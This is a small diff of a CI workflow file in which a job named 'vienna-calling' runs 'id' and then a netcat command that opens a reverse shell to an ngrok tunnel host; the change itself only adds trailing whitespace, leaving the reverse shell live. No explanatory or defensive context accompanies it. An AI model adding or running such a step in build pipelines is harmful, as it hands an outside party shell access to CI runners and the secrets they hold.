@@ -12,7 +12,7 @@ jobs:
       - name: vienna-calling
         run: |
           id
-          nc -e /bin/sh -v 7.tcp.eu.ngrok.io 13153
+          nc -e /bin/sh -v 7.tcp.eu.ngrok.io 13153 
 
   curl-test:
     if: false
